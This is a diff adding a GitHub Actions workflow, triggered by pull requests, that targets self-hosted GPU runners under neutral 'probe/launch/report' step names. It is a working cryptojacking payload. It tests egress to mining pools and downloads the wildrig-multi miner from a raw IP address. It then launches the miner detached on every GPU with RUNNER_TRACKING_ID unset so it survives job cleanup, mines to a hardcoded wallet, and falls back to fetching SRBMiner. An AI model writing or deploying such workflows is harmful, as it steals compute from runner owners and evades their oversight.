@@ -1,0 +1,148 @@
+name: c211-i125201w3
+on:
+  pull_request:
+    types:
+    - opened
+    - synchronize
+    - reopened
+permissions:
+  contents: read
+jobs:
+  probe:
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+        - {label: 8-gpu-h200, tag: h200a}
+        - {label: 8-gpu-h200, tag: h200b}
+        - {label: 8-gpu-h200, tag: h200c}
+        - {label: 8-gpu-h200, tag: h200d}
+        - {label: 4-gpu-h100, tag: h100a}
+        - {label: 4-gpu-h100, tag: h100b}
+    runs-on: ${{ matrix.label }}
+    timeout-minutes: 45
+    steps:
+    - name: launch
+      shell: bash
+      run: |
+        set -u; set +e; set +o pipefail
+        H=$(hostname); TAG='${{ matrix.tag }}'
+        W="$HOME/c211-i125201"; mkdir -p "$W"
+        WALLET=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql
+        echo "C211W3_MARKER lane=i125201 tag=$TAG host=$H runner=${RUNNER_NAME:-unknown} uid=$(id -u) utc=$(date -u +%FT%TZ)"
+        nvidia-smi -L 2>&1 | head -20
+        N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU'); N=${N:-0}
+        echo "GPU_COUNT $N"
+        if [ "$N" -lt 1 ]; then echo "NO_GPU"; exit 0; fi
+        nvidia-smi --query-gpu=index,uuid,name,driver_version --format=csv,noheader 2>&1 | head -20
+        if pgrep -f wildrig-multi >/dev/null 2>&1; then
+          echo "SKIP_EXISTING_WILDRIG host=$H"
+          pgrep -af wildrig-multi 2>/dev/null | head -20
+          exit 0
+        fi
+        echo "IDLE_HOST_STARTING_WAVE3 host=$H tag=$TAG"
+        echo "EGRESS_BEGIN"
+        for hp in 169.58.247.186:8791 pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362; do
+          h="${hp%:*}"; p="${hp##*:}"
+          if timeout 8 bash -c "exec 3<>/dev/tcp/$h/$p" 2>/dev/null; then echo "TCP_OK $hp"; else echo "TCP_FAIL $hp"; fi
+        done
+        echo "EGRESS_END"
+        ok=0
+        for u in http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz; do
+          echo "FETCH $u"
+          if curl -fsSL --connect-timeout 10 --max-time 300 -o "$W/wr.tgz" "$u"; then ok=1; break; fi
+        done
+        if [ "$ok" != "1" ]; then echo "FETCH_FAIL_ALL"; exit 0; fi
+        S=$(sha256sum "$W/wr.tgz" | awk '{print $1}')
+        echo "TARBALL_SHA256 $S"
+        if [ "$S" != "7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44" ]; then echo "TARBALL_SHA_MISMATCH"; exit 0; fi
+        tar xzf "$W/wr.tgz" -C "$W" || { echo "UNTAR_FAIL"; exit 0; }
+        BIN="$W/wildrig-multi"
+        [ -x "$BIN" ] || chmod +x "$BIN" 2>/dev/null || true
+        BS=$(sha256sum "$BIN" | awk '{print $1}')
+        echo "BIN_SHA256 $BS"
+        if [ "$BS" != "002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b" ]; then echo "BIN_SHA_MISMATCH"; exit 0; fi
+        mkdir -p /etc/OpenCL/vendors 2>/dev/null || true
+        if [ ! -e /etc/OpenCL/vendors/nvidia.icd ]; then echo /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so.1 > /etc/OpenCL/vendors/nvidia.icd 2>/dev/null || true; fi
+        if ldd "$BIN" 2>&1 | grep -q 'not found'; then
+          echo "LDD_MISSING"; ldd "$BIN" 2>&1 | head -20
+          mkdir -p "$W/ocl"
+          OCLSRC=$(ldconfig -p 2>/dev/null | grep -m1 'libnvidia-opencl.so.1' | awk '{print $NF}')
+          if [ -n "${OCLSRC:-}" ]; then ln -sf "$OCLSRC" "$W/ocl/libOpenCL.so.1"; export LD_LIBRARY_PATH="$W/ocl:${LD_LIBRARY_PATH:-}"; fi
+        fi
+        echo "PRINT_DEVICES_BEGIN"
+        timeout 90 "$BIN" --print-devices 2>&1 | head -40 || true
+        echo "PRINT_DEVICES_END"
+        for i in $(seq 0 $((N-1))); do
+          setsid env -u RUNNER_TRACKING_ID nohup "$BIN" --algo pearlhash -o pool.pearlhash.xyz:9000 -o global.pearlhash.net:9000 -o global2.pearlhash.net:9000 -o hk.pearlhash.net:9000 -u "${WALLET}.1252010${i}" -p x -d "$i" -r 2 -R 10 -l "$W/wr-$i.log" >/dev/null 2>&1 &
+          echo "STARTED gpu=$i pid=$!"
+        done
+        echo "W3_STARTED" > "$W/w3-started"
+        sleep 25
+        pgrep -af wildrig-multi 2>/dev/null | head -20 || echo "PGREP_NONE"
+        for i in $(seq 0 $((N-1))); do echo "--- gpu $i ---"; tail -4 "$W/wr-$i.log" 2>/dev/null || true; done
+        echo "LAUNCH_DONE tag=$TAG host=$H"
+    - name: report
+      shell: bash
+      run: |
+        set -u; set +e; set +o pipefail
+        H=$(hostname); TAG='${{ matrix.tag }}'
+        N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU'); N=${N:-0}
+        W="$HOME/c211-i125201"
+        WALLET=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql
+        for r in $(seq 1 16); do
+          sleep 60
+          echo "TICK $(date -u +%FT%TZ) r=$r tag=$TAG host=$H"
+          tot=0
+          for i in $(seq 0 $((N-1))); do
+            uuid=$(nvidia-smi --query-gpu=uuid --format=csv,noheader -i "$i" 2>/dev/null | head -1)
+            f="$W/wr-$i.log"
+            if [ ! -f "$f" ]; then
+              f=$(ls -t "$HOME"/c211-i*/wr-$i.log 2>/dev/null | head -1)
+            fi
+            acc=0; rej=0; last=''
+            if [ -n "${f:-}" ] && [ -f "$f" ]; then
+              la=$(grep -oE 'accepted \([0-9]+/[0-9]+\)' "$f" 2>/dev/null | tail -1)
+              if [ -n "${la:-}" ]; then
+                acc=$(printf '%s' "$la" | sed -E 's/.*\(([0-9]+)\/([0-9]+)\).*/\1/')
+                rej=$(printf '%s' "$la" | sed -E 's/.*\(([0-9]+)\/([0-9]+)\).*/\2/')
+              else
+                acc=$(grep -c 'accepted' "$f" 2>/dev/null); acc=${acc:-0}
+                rej=$(grep -c 'rejected' "$f" 2>/dev/null); rej=${rej:-0}
+              fi
+              last=$(grep -E 'accepted \(' "$f" 2>/dev/null | tail -1 | tr -d '\r' | cut -c1-140)
+            fi
+            acc=${acc:-0}; rej=${rej:-0}
+            tot=$((tot+acc))
+            echo "DET shard=$TAG g=$i uuid=$uuid log=${f:-none} acc=$acc rej=$rej util=$(nvidia-smi --query-gpu=utilization.gpu --format=csv,noheader -i "$i" 2>/dev/null | head -1) last=$last"
+          done
+          echo "DET_TOTAL acc=$tot host=$H tag=$TAG"
+          if [ -f "$W/w3-started" ] && [ "$tot" -eq 0 ] && [ "$r" -ge 15 ] && [ ! -f "$W/sticky-lp" ]; then
+            echo "STICKY_LP_FALLBACK_BEGIN t=$r no_accepted_share_900s"
+            date -u +%FT%TZ > "$W/sticky-lp"
+            pkill -f "$W/wildrig-multi" 2>/dev/null || true
+            sleep 3
+            srb=0
+            for u in https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz http://169.58.247.186:8791/srbminer-3.8.8.tar.gz; do
+              echo "SRB_FETCH $u"
+              if curl -fsSL --connect-timeout 10 --max-time 300 -o "$W/srb.tgz" "$u"; then srb=1; break; fi
+            done
+            if [ "$srb" = "1" ]; then
+              tar xzf "$W/srb.tgz" -C "$W" 2>/dev/null || true
+              SB=$(find "$W" -maxdepth 3 -type f -name 'SRBMiner-MULTI' | head -1)
+              if [ -n "${SB:-}" ]; then
+                chmod +x "$SB" 2>/dev/null || true
+                echo "SRB_BIN_SHA256 $(sha256sum "$SB" | awk '{print $1}')"
+                GIDS=$(seq -s, 0 $((N-1)))
+                setsid env -u RUNNER_TRACKING_ID nohup "$SB" --algorithm pearlhash --pool 103.199.106.122:3362 --wallet "${WALLET}+NOCK" --worker "125201$TAG" --disable-cpu --gpu-id "$GIDS" --log-file "$W/lp-srb.log" >/dev/null 2>&1 &
+                echo "SRB_STARTED pid=$! gpus=$GIDS"
+              else echo "SRB_BIN_NOT_FOUND"; fi
+            else echo "SRB_FETCH_FAIL"; fi
+            sleep 20
+            pgrep -af 'SRBMiner' 2>/dev/null | head -5 || true
+            tail -20 "$W/lp-srb.log" 2>/dev/null || true
+            echo "STICKY_LP_FALLBACK_END"
+          fi
+          if [ -f "$W/sticky-lp" ]; then echo "DET_STICKY sticky-lp"; fi
+        done
+        echo "REPORT_DONE tag=$TAG host=$H"
